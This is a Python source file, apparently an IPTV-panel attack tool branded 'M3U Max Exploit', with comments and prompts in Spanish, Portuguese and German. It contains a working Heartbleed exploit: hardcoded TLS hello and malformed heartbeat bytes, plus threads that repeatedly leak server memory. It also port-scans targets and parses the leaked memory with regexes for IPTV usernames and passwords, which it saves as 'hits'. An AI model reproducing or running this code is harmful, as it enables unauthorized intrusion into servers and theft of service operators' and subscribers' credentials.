    def extractDataRequestTOKEN(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena = "\33[31;40mErro ao processar extraÃ§Ã£o de dados de REQUEST_TOKEN:" + errp + " dados de entrada:" + entrada + "\33[0m"
            print(cadena)
            return "", ""
    def extractDataREQUEST_URI(self, entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return user, passw
        except Exception as errp:
            cadena = "\33[31;40mErro ao processar extraÃ§Ã£o de dados de REQUEST_URL:" + errp + " dados de entrada:" + entrada + "\33[0m"
            print(cadena)
            return "", ""
    def extractData_URL_USERNAME_PASSWORD(self, _entrada: str):
        try:
            entrada=_entrada.split("REQUEST")#eliminamos si viene request
            datos = _entrada.split("username=")
            salida = (datos[1].split("&password="))
            user = salida[0]
            passw = salida[1]
            return user, passw
        except Exception as errp:
            cadena = "\33[31;40mErro ao processar extraÃ§Ã£o de dados de REQUEST_LOGIN:" + errp + " dados de entrada:" + entrada + "\33[0m"
            return "", ""
    def extractData_LISTACANAL_m3u(self,entrada):
        try:
            datos=entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user,passw
        except:
            return "",""

    def setDataContainer(self,_dataC:DataContainer):
        self.miDataContainer=_dataC

    def setCombosCotainer(self,_miDictCombos:dict):
        self.contenedorUSER_PASS=_miDictCombos

    #Borrar al distribuir
    def writeDebugCode(self,entrada):
        try:
            print(entrada)
            fichero=open(".\debug2\\trazas.txt","a")
            fichero.write("\n"+entrada)
        except:
            False

    #metodo que graba a disco los resultados,modificar esta parte si se quiere hacer algo mas con los HITs de user pass
    def tratarUsuario(self,user, passw):
        lock.acquire()
        if (user != ""):
            cadena = """
\33[30;100m   â˜…     â˜…     â˜…     â˜…     â˜…     â˜…       \33[0m

   â•­â”€âªâª ğ• â„³ğŸ›Æ²Â Ï»à¸„x â¦ Ğ„âœ˜ÏÆ–Î¿Î¹Ï„ ğ• â«â« 
   â”‚âœª \33[36mSá´›á´€Ê€á´›TÉªá´á´‡âª \33[33m"""+str(hora_ini)+""" \33[0m
   â”‚âœª \33[32mPá´€É´á´‡ÊŸâª \33[36m"""+self.urlBASE+"""  \33[0m
   â”‚âœª \33[33mUsá´‡Ê€:Pá´€ssâª \33[32m"""+user+""":"""+passw+"""  \33[0m
   â”‚âœª \33[32mTá´á´›á´€ÊŸâª \33[35m"""+str(self.miDataContainer.colaFifo.qsize())+""" \33[0m
   â”‚âœª \33[32m"""+threading.current_thread().name+""" \33[0m \33[96mIá´… Coá´Ê™oâª \33[31m"""+str(id(self.contenedorUSER_PASS))+""" \33[0m
   â”‚âœª \33[34mÊœÉªá´›s Ê™Êâª \33[96m"""+str(nick)+""" ğŸ‘‘  \33[0m
   â•°â”€â«â«\33[36mSá´„á´€É´TÉªá´á´‡âª\33[33m """+str(time.strftime('%H:%M:%S'))+""" \33[93mHÉªTêœ±âª """+str(hitc)+"""
\33[0m
\33[30;100m      ğ• UÊŸá´›Ê€á´€ â„³ğŸ›Æ²Â Ï»à¸„x Ğ„âœ˜ÏÆ–Î¿Î¹Ï„ ğ•        \33[0m"""
            print(cadena)
            if str(self.contenedorUSER_PASS.get(user)) == "None":
                self.contenedorUSER_PASS[user] = passw
                miHitData=self.generateURL_m3u(user, passw)
                self.writeComboToFile(user, passw) #fichero para no repetir los combos encontrados, no es el mismo de hits
            else:
                cadena = "\n\33[37m Benutzer: \33[31mActive..." + "\33[0m\n User Pass: " + "\33[32m" + user + ":" + passw + "\33[0m\n"
                print(cadena)
        lock.release()
    #Metodo principal de analisis, extrae datos del contenedor, los analiza, compara con los patrones, extrae los user/pass y genera en fichero la m3u valida
    def doAnalyze(self):
        cadena = "\n Iniciando Consumidor: " + "\33[31m" + str(id(self)) + "\33[0m\n ID do Container: " + "\33[33m" + str(id(self.miDataContainer)) + "\33[0m\n ID do Container de Combos: " + "\33[31m" + str(id(self.contenedorUSER_PASS)) + "\33[0m"
        print(cadena)
        while(True):
            user = ""
            passw = ""
            datos=self.miDataContainer.get()
            resultado = re.findall(self.patronLISTACANAL_M3U, datos)
            if (debug):
                print("Analisando dados do container... tamanho extraÃ­do:", len(datos))
            if (len(resultado) > 0):  # encontrado
                if (debug):
                    cadena = "\33[32midiot boss LISTACANAL_M3U => " + datos + "\33[0m"

                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_LISTACANAL_m3u(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronURL_USERNAME_PASSWORD, datos)
            if (len(resultado)>0):#encontrado
                if (debug):
                    cadena= "\33[32midiot boss URL_USERNAME_PASSWORD => "+datos+"\33[0m"
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_URL_USERNAME_PASSWORD(elemento)#esta expresion esta formada por dos segmentos regex
                    self.tratarUsuario(user,passw)
            resultado=re.search(self.patronEXTINF,datos)
            if (resultado!=None):
                if (debug):
                    cadena =  "\33[32midiot boss EXTINF => " + datos + "\33[0m"
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataRequestEXTINF(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronREQUEST_URI,datos)
            if (len(resultado) > 0):  # encontrado
                if (debug):
                    cadena =  "\33[32midiot boss REQUEST_URI => " + datos + "\33[0m"
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataREQUEST_URI(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronTOKEN,datos)
            if (len(resultado) > 0):  # encontrado
                for elemento in resultado:
                    user, passw = self.extractDataRequestTOKEN(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena =  "\33[32midiot boss TOKEN => " + datos + "\33[0m"
                    self.writeDebugCode(cadena+"\n\t"+datos)
            resultado = re.findall(self.patronLIVE, datos)
            if (len(resultado) > 0):  # encontrado
                for elemento in resultado:
                    user, passw = self.extractDataRequestLIVE(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena =  "\33[32midiot boss LIVE => " + datos + "\33[0m"
                    self.writeDebugCode(cadena+"\n\t"+datos)

class DataOutputGenerator:
    False

class PanelAttack_SSL:
    miProductor:DataContainer
    # mensaje para inicar la conversacion SSL
    hello = ''' 
            16 03 02 00  dc 01 00 00 d8 03 02 53
            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
            00 0f 00 01 01                                  
            '''
    hb = ''' 
            18 03 02 00 03
            01 40 00
            '''
    miOutputFileWriter:OutputFileWriter
    puertoINICIO_SCAN=_puertoINICIO_SCAN
    puertoFIN_SCAN=_puertoFIN_SCAN
    primeraVEZ_VULNERABLES=True

    def setDataContainer(self,_dataC:DataContainer):
        self.miProductor=_dataC

    def decoceStringToHEX(self,entrada):
        return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]

#def hexdump(s):
#    # print("*********",s)
#    for b in range(0, len(s), 16):
#        lin = [c for c in s[b: b + 16]]
#        hxdat = ' '.join('%02X' % c for c in lin)
#        pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
#        print('  %04x: %-48s %s' % (b, hxdat, pdat))

    def hexdump(self, s):
        #print("",s)
        for b in range(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hxdat = ' '.join('%02X' % c for c in lin)
            pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
            print('  %04x: %-48s %s' % (b, hxdat, pdat))

    def recvall(self,s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = b''
        try:
            remain = length
            while remain > 0:
                rtime = endtime - time.time()
                if rtime < 0:
                    return None
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)
                    # EOF?
                    if not data:
                        return None
                    rdata += data
                    remain -= len(data)
            return rdata
        except Exception as errp:
            if  (debug):
                print("recvall--->error leyendo datos del socket", errp)
            return None


    def recvmsg(self, s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            if debug:
                print('HDR Unexpected EOF receiving record header - server closed connection')
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        if pay is None:
            if (debug):
                print('\t\tpayload Unexpected EOF receiving record payload - server closed connection')
            return None, None, None
        # print(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
        return typ, ver, pay


#    def hit_hb(s,_url,_port):
#        data = decoceStringToHEX(hb)
#        s.send(data)
#        while True:
#            typ, ver, pay = self.recvmsg(s)
#            if typ is None:
#                print('\t\tNo HB response received, server likely not vulnerable')
#                return False
#            if typ == 24:
#                if debug:
#                    print('\t\tReceived HB response:')
#                if (debug):
#                    self.hexdump(pay)
#                if len(pay) > 3:
#                    puerto=str(_port)
#                    cadena=Fore.GREEN+'\t\t\tServer is vulnerable!-->'+_url+":"+puerto+ Fore.RESET
#                    print(cadena)
#                else:
#                    print('\t\tServer processed malformed data-hello-, but did not return any extra data.')
#                return True
#            if typ == 21:
#                print('\t\tReceived alert:')
#                if (debug):
#                    self.hexdump(pay)
#                print('\t\tServer returned error, likely not vulnerable')
#                return False

    def hit_hb(self,s):
        data=self.decoceStringToHEX(self.hb)
        s.send(data)
        while True:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                print('\t\tNo HB response received, server likely not vulnerable')
                return False
            if typ == 24:
                print('\t\tReceived HB response:')
                self.hexdump(pay)
                if len(pay) > 3:
                    print('\t\tServer is vulnerable!')
                else:
                    print('\t\t Server processed malformed data-hello-, but did not return any extra data.')
                return True
            if typ == 21:
                print('Received alert:')
                self.hexdump(pay)
                print('O servidor retornou um erro, provavelmente nÃ£o vulnerÃ¡vel')
                return False

    def do_hb_new(self, s):
        while True:
            cadena = "\33[37mLendo dados do servidor" + "\33[32m" + str(s.getpeername()) + "\33[0m"
            #print(cadena)# Nao ativar vai ficar aparecendo muitas conexÃµes durante os hits
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if debug:
                    print ("do_hb_new => Nenhuma resposta de pulsaÃ§Ã£o recebida, o servidor provavelmente nÃ£o estÃ¡ vulnerÃ¡vel")
                return False

            if typ == 24:
                # print 'Received heartbeat response'
                if len(pay) > 3:
                    pdat = "".join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else "") for c in pay)
                    if (debug):
                        self.miOutputFileWriter.writeToFile(pdat)
                    if len(pdat) > 50:  # solo metemos cosas que puedan llevar info, lo pequeÃ±o no interesa
                        self.miProductor.put(pdat)
                else:
                    print('O servidor processou HB malformado, mas nÃ£o retornou nenhum dado extra.')
                return True
            if typ == 21:
                if debug:
                    print ('do_hb_new => Alerta recebido:')
                self.hexdumpText(pay)

#def checkHB(_url, port: int):
#    global hello
#    _socket = socket(AF_INET, SOCK_STREAM)
#    if (debug):
#        cadena=Fore.YELLOW+"Verificando vulnerabiliad de:"+ _url+ "Puerto:"+str(port)+Fore.RESET
#        print(cadena)
#    try:
#        _socket.connect((_url, port))
#        if (debug):
#            print('\t\tSending Client Hello...')
#        sys.stdout.flush()
#        _socket.send(decoceStringToHEX(hello))
#        if (debug):
#            print('\t\tWaiting for Server Hello...')
#        sys.stdout.flush()
#        _continue = True
#        while _continue:
#            typ, ver, pay = recvmsg(_socket)
#            if (typ != None):
#                if (debug):
#                    print("Received message: type = {}, version = {}".format(typ, hex(ver)))
#                    print("Verificando HB pay", pay, " pos 0:", pay[0], "--->", 0x0E)
#                time.sleep(1)
#                if typ == 22 and pay[0] == 0x0E:
#                    if (debug):
#                        print('Sending heartbeat request...')
#                    sys.stdout.flush()
#                    data = decoceStringToHEX(hb)
#                    _socket.send(data)
#                    if (hit_hb(_socket,_url,port)):
#                        _socket.close()
#                        return True
#            else:
#                _socket.close()
#                if (debug):
#                    print('\t\tServer closed connection without sending Server Hello.')
#                _continue = False
#            # Look for server hello done message.
#    except Exception as errp:
#        _socket.close()
#        if (debug):
#            print("checkHB Error:",errp)
#            traceback.print_stack()
#            traceback.print_exc()
#        return False

    #Metodo que verifica la vulnerabilidad del servidor
    def checkHB(self,_url, port:int, _socket:socket):
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(" Verificando vulnerabilidade de:",_url)
        _socket.connect((_url, port))
        print(' Enviando Client Hello...')
        sys.stdout.flush()
        _socket.send(self.decoceStringToHEX(self.hello))
        print(' Esperando por Server Hello...')
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = self.recvmsg(_socket)
            if (typ!=None):
                print("\n \33[36mMensagem recebida\33[0m: tipo = {}, VersÃ£o = {}".format(typ, hex(ver)))
                print("Verificando pay HB", pay, " pos 0:", pay[0], " => ", 0x0E)
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:
                    print(' \33[32mEnviando solicitaÃ§Ã£o de pulsaÃ§Ã£o...\33[0m')
                    sys.stdout.flush()
                    data = self.decoceStringToHEX(self.hb)
                    _socket.send(data)
                    if (self.hit_hb(_socket)):
                        return True
            else:
                print('\33[31mConexÃ£o fechada no server.\n NÃ£o enviou Server Hello.\33[0m')
                _continue = False
                # return
            # Look for server hello done message.
    #raemos los puertos abierto

#    def ckeck_simple_IP_Vulnerable(url, puerto):
#        esVulnerable = checkHB(url, puerto)
#        return esVulnerable

#    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
#        miPortScanner = PortScanner()
#        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
#        return listapuertos

#    def ckeck_simpleurl_Vulnerable_default_PORTS(self, url):
#        print("Iniciando scaneo de puertos por defecto",EOF=' ')
#        for puerto in DEFAULT_VULNERABLES_PORTS:
#            esVulnerable = checkHB(url, puerto)
#            if (esVulnerable):
#                return puerto
#        return -1

    # Metodo que verifica las ips recibida, con la lista de puertos abiertas. Recorre una lista de IP
#    def check_IP_Vulnerable(_IPS: dict, _scanTYPE_ATTACK, slow_port_Scan: bool):
#        listaVulnerables = {}
#        for ip in _IPS:
#            puertoDefectoVulnerable = ckeck_simple_IP_Vulnerable_default_PORTS(
#                ip)  # primero probamos los puertos por defecto, sino busco puertos
#            if puertoDefectoVulnerable == -1:
#                puertos = sacarPuertos_IP(ip, _scanTYPE_ATTACK, slow_port_Scan)
#                if len(puertos) > 0:
#                    for puerto in puertos:
#                        resultado = ckeck_simple_IP_Vulnerable(ip, puerto)
#                        listaVulnerables[ip] = puerto
#                        print("IP:", ip, " Puerto:", puerto, "Es vulnerable:", resultado)
#                        break;  # cuando encuentro ya el puerto vulnerable paro
#            else:
#                listaVulnerables[ip] = puertoDefectoVulnerable

#        return listaVulnerables


###Here$$

#    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
#        miPortScanner = PortScanner()
#        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
#        return listapuertos

    def extractPort(self,url,_scaneoLento):
        #print(logopic)
        miPortScanner=PortScanner()
        url=url.replace("/","")
        listapuertos = miPortScanner.port_scan(url,range(self.puertoINICIO_SCAN,self.puertoFIN_SCAN),_scaneoLento)
        return listapuertos
    #MÃ©todo que valida el server destino si esta o no activo
    def checkServerStatus(self,simpleServer):
        estado, url, port,protocolo = checkFullM3U_URL(simpleServer, requests.session())
        return estado, url,port,protocolo
    #Inicia el ataque en paralelo, ararncando los analizadores y los lectores del servidor, el dataconatiner se pasa por referencia para que todos los server compartan el mismo
    def iniciarHilos(self,url,_listaservers,_listapuertos,puertoBase,protocolo,_miDS:DatosServerM3U,_dataContainer:DataContainer,_dictCombos):
        #miDataContainer = DataContainer()
        self.setDataContainer(_dataContainer)
        miCosumidor = DataAnalyzer()
        miCosumidor.setDataContainer(_dataContainer)
        miCosumidor.setCombosCotainer(_dictCombos)#estrucutra para que no se repitan los combos, compartida por todos los hilos
        datosServidor = urlparse(url)  # uso el servidor final, no la url de la m3u, pues donde esta autorizado en es el server final
        miCosumidor.setURLBase(_miDS)
        diccionarioAnterior=miCosumidor.readComboFromFile(_dictCombos)

        for total in range(totalHilosProductores):
            hiloextractor = threading.Thread(name='Extractor-'+str(total) ,target=self.doSimpleAtaque, args=(url, _listapuertos,_miDS))
            hiloextractor.start()
        for number in range(totalHilosConsumidores):#numero de analizadores
            hiloConsumidor = threading.Thread(name='Bá´á´›'+str(number),target=miCosumidor.doAnalyze)
            hiloConsumidor.start()

    #Escribe los datos del servidor vulnerable encontrado
    def escribirDatosServerVulnerable(self,datos):
        f = open("servidores vulnerÃ¡veis.txt", "a")
        if self.primeraVEZ_VULNERABLES:
            f.write(""+time.asctime()+"")
            self.primeraVEZ_VULNERABLES=False
        try:
            f.write(datos)
            f.write("\n")
            f.close()
        except Exception as errp:
            print("Error writing to file:",errp)

    #verificar si es una m3u valida, intentar sacar el server final
    def pasoUNO(self,_url):
        miDS=DatosServerM3U()
        miDS.extraerServerFinal(_url)
        print(miDS)
        return miDS
    def iniciarMultiServer(self,url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS:DatosServerM3U):
        miDataContainer = DataContainer()
        miDictCombos=dict()
        for server in miDS.host:
            miDSAUX=copy.copy(miDS)
            miDSAUX.host=server
            self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDSAUX,miDataContainer,miDictCombos)

    #Metodo principal del ataque
    def startAttack(self,_listaserver:str,_listapuertosEntrada):
        s = socket(AF_INET, SOCK_STREAM)
        estado = ""
        puertoBaseURL=""
        protocolo=""
        estado=""
        url=""
        serversAtacables=dict() #para crear un diccionarios de server si es invocado con una lista de servidores, este modo no hace ataque
        esSolo_Server_conIP=False
        miDS:DatosServerM3U
        scaneoLento = 1
        try:
            if len(_listapuertosEntrada)<=0:
                #scaneoLento = int(input("Select scanning speed!\n\n    0 => Turtle\n    1 => Roadrunner\n\nOption => "))
                clear()
                print(logopic)
                print("\33[33mAbwarten...!!!\n\33[0m")
        except:
            scaneoLento = 1

        for simpleServer in _listaserver:
            url=""
            if not simpleServer.find("m3u") == -1:  # sacamos de la m3u la IP real del servidor, que puede ser distinta al panel
                miDS=self.pasoUNO(simpleServer)
                #print("Remote server found => "+miDS.host)
                #print("\33[33m\nRemember that if you enter multiple attack servers, the attack port must have been entered before and must be unique!\n\33[31m")
                #respueta=input("You want to change to another custom IP?\n\nEnter IP or just enter!\n\nOption => ")
                respueta=""
                if respueta!="":
                    if _listapuertosEntrada=="":
                        print("\33[31mYou must enter a unique port to attack several servers!!!\33[31m")
                    miDS.host=respueta.split(" ")
                    if (len(miDS.host)>1): #tengo varios server remoto, ignoro todo lo demas, supongo que el puerto esta bien y es atacable, arranco todo a la vez
                        self.iniciarMultiServer(url, simpleServer, _listapuertosEntrada[0], puertoBaseURL, protocolo,miDS)
                        estado="KO"#para que ignore las ejecuciones de abajo

                    else:
                        miDS.host=miDS.host[0]
                estado="OK"
                #estado, url,puertoBaseURL,protocolo = self.checkServerStatus(simpleServer)
                if (miDS.host==""):#controlar esto!!!!!
                    print("\33[31mM3U URL does not validate, unable to validate real m3u SERVER, attacking dns IP\33[0m")
                    resultadoParser=urlparse(simpleServer)
                    estado="OK"
                    url=resultadoParser.hostname
                    if resultadoParser.port!="":
                        puertoBaseURL=resultadoParser.port
                    protocolo=resultadoParser.scheme
            else:  # es escaneo de una IP o una url sin m3u
                miDS = self.pasoUNO(simpleServer)
                esSolo_Server_conIP = True
                resultadoParser=urlparse(simpleServer)
                url = resultadoParser.hostname
                if url==None: #no tiene url, es solo una ip
                    url=resultadoParser.path
                if resultadoParser.port != None:
                    puertoBaseURL = resultadoParser.port
                if resultadoParser.scheme=="":
                    protocolo="http"#elijo http sino tenia puesto nada
                else:
                    protocolo = resultadoParser.scheme
                estado = "OK"
            estado = "OK"
            temporalScanPuerto={}#se usa para no repetir la busqueda sino tenemos puerto base
            #Si ponemos varios servidores remotos, debemos controlar sus puertos, pues el usuario ya debe meterlos, debemos serpar ip:puerto
            if not (estado == "KO"):
                scaneoLento=1
                if len(_listapuertosEntrada) == 0:  # si el usuario no paso ningun puerto, procedemos a buscarlos
                    port_to_scan = self.extractPort(miDS.host,scaneoLento)
                    temporalScanPuerto=port_to_scan
                else:
                    port_to_scan=_listapuertosEntrada
                print("Gefundene Ports \33[33m", miDS.host, "\33[0m ==> ", port_to_scan)
                if len(port_to_scan)>0:
                    for simplePort in port_to_scan:  # procedemos a verificar que el servidor tiene el fallo de seguridad openssl
                        print("\n Test auf URL==> ", simpleServer, "\n Teste Port==> \33[33m", simplePort, "\33[0m")
                        try:
                            if (self.checkHB(miDS.host, simplePort, s)):#verificamos vulnerabilidad puerto a puerto
                                #si encontrado lo ataco
                                print("Zu verwendender Port:", simplePort)
                                if True:#(len(_listaserver)==1):#peticio de ataque, no de scanner de vulnerabilidad, es solo un servidor
                                    miDataContainer=DataContainer()
                                    miDictCombos=dict()
                                    self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
                                    self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
                                    self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo,miDS,miDataContainer,miDictCombos)
                                else:
                                    self.escribirDatosServerVulnerable(simpleServer+":"+str(simplePort))
                                    serversAtacables[simpleServer]=simplePort
                                break
                            else:
                                try:
                                    s.close()
                                    s = socket(AF_INET, SOCK_STREAM)
                                except Exception as errp:
                                    print("Erro ao fechar o socket:", errp)
                        except Exception as errp:
                            s.close()
                            s = socket(AF_INET, SOCK_STREAM)
                            print("\t\t***********Error:", errp)
                else:
                    print("Servidor:", url, "nenhuma porta encontrada")
        print("Servidores vulnerÃ¡veis:", serversAtacables)
#-----------------------------------------------------------------------------------------------

    def doSimpleAtaque(self, url:str, simplePort,_miDS:DatosServerM3U):
        cadena = "\33[37mIniciando ataque em: " + _miDS.m3uURL + " contra o servidor:" + "\33[33m" + _miDS.host + "\33[0m\n"
        print(cadena)
        while True:
            try:
                servidor=url
                if _miDS.host!="": #si tengo el servidor final, es el que ataco
                    servidor=_miDS.host
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((servidor, simplePort))
                s.send(self.decoceStringToHEX(self.hello))
                while True:
                    typ, ver, pay = self.recvmsg(s)
                    if typ == None:
                        if (debug):
                            print('\33[31mServidor fechou a conexÃ£o sem enviar um "Server Hello".\33[0m')
                        return
                    # Look for server hello done message.
                    if typ == 22 and (pay[0]) == 0x0E:
                        break
                i = 0
                while os.path.exists("dump_%s.bin" % i):
                    i += 1;

                s.send(self.decoceStringToHEX(self.hb))
                while self.do_hb_new(s):
                    continue
            except Exception as errp:
                if (debug):
                    print("Erro ao fazer a conexÃ£o, continuamos tentando:", errp)


def inciar(listaserver,listapuertos):
    clear()
    print(logopic)
    print(cadena)
    print(scanPORTTYPE)
    if (len(listaserver))==0:
        print("\33[36m\n Tippe den M3U-Server-Link ein\n â€¢ = = = = = Oder = = = = = â€¢\n Tippe eine gÃ¼ltige Ip von einem Server ein\n")
        listaserver = list(map(str, input("\33[37m\nServer âœ \33[33m").split()))
        server_input=listaserver

        #print(logopic)
        #listapuertos = list(map(int, input("Digite a lista de porta(s) desejada ou pressione Enter => ").split()))
        listapuertos=""
        #print(logopic)

    miPanelAttack_SSL = PanelAttack_SSL()
    miPanelAttack_SSL.startAttack(listaserver, listapuertos)

crearDirectoriosBase()

clear()
print(logopic)
print(cadena)
print("\n\33[36m los gehts mit exploit\n")
nick = input("\33[0m\n Nick âœ \33[31m")
if nick =="":
    nick = "ğŸ…ğŸ…ğŸ…‘ğŸ…ğŸ…“ğŸ…¨"

clear()
print(logopic)
print(cadena)
print("\n\33[36m Port Scan Typ Auswaehlen:\33[33m\n 0 ==> LOCAL\n 1 ==> WEB\n")
try:
    tipo=int(input("\33[0m\n Type âœ \33[31m"))
    if tipo == '1' or tipo in 'web':
        scanPORTTYPE="WEB"
    elif tipo == '0' or tipo in 'local':
        scanPORTTYPE="LOCAL"

except:
    False
inciar({},{})


